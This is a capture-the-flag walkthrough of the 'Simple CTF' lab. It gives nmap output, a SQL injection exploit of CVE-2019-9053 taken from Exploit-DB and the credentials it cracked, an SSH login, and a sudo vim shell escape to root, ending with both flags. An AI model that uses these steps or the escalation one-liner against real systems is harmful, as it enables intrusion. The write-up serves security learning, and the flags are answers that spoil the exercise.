# Simple CTF


Firstly Nmap Scan result:

nmap -sC -sV -oN nScan 10.10.80.2 -T5        
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-07 01:06 EDT
Nmap scan report for 10.10.80.2
Host is up (0.23s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.23.137.206
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
| http-robots.txt: 2 disallowed entries 
|_/ /openemr-5_0_1_3 
|_http-server-header: Apache/2.4.18 (Ubuntu)
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 29:42:69:14:9e:ca:d9:17:98:8c:27:72:3a:cd:a9:23 (RSA)
|   256 9b:d1:65:07:51:08:00:61:98:de:95:ed:3a:e3:81:1c (ECDSA)
|_  256 12:65:1b:61:cf:4d:e5:75:fe:f4:e8:d4:6e:10:2a:f6 (ED25519)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 54.99 seconds






# Task 1

1. How many services are running under port 1000?

'''
2   // They are 21 and 80 (form nmap result)
'''

2. What is running on the higher port?

'''
SSH  // on port 2222 from nmap result
'''

3. What's the CVE you're using against the application? 

'''
CVE-2019-9053     //Found a /simple page with gobuster and found out that its running a CMS Made Simple version 2.2.8 which is vernerable to the mentioned CVE.
'''

4. To what kind of vulnerability is the application vulnerable?

'''
SQLi    // The mentioned cve is vulnerable to SQLi attack
'''

On the Website 	https://www.exploit-db.com/exploits/46635
I found python code a and i just copied it as exploit.py and ran it and the result were:
Used rockyou.txt



[+] Salt for password found: 1dac0d92e9fa6bb2
[+] Username found: mitch
[+] Email found: admin@admin.com
[+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96
[+] Password cracked: secret




5. What's the password?

'''
secret    // Found in the result of the exploit code.
'''

6. Where can you login with the details obtained?

'''
SSH   
'''

7. What's the user flag?

'''
G00d j0b, keep up!  // Found in the /home/mitch after login via ssh with password 'secret' found
'''

8. Is there any other user in the home directory? What's its name?

'''
sunbath   // cd /home/  
'''


9. What can you leverage to spawn a privileged shell?

'''
vim   // Found it by 'sudo -l'    it said (root) NOPASSWD: /usr/bin/vim
'''



after that i went to GTFObin and search for vim and went to sudo and found this cmd sudo vim -c ':!/bin/sh'
Ran that cmd and boom i have root
found the root.txt in /root/

10. What's the root flag?

'''
W3ll d0n3. You made it!
'''

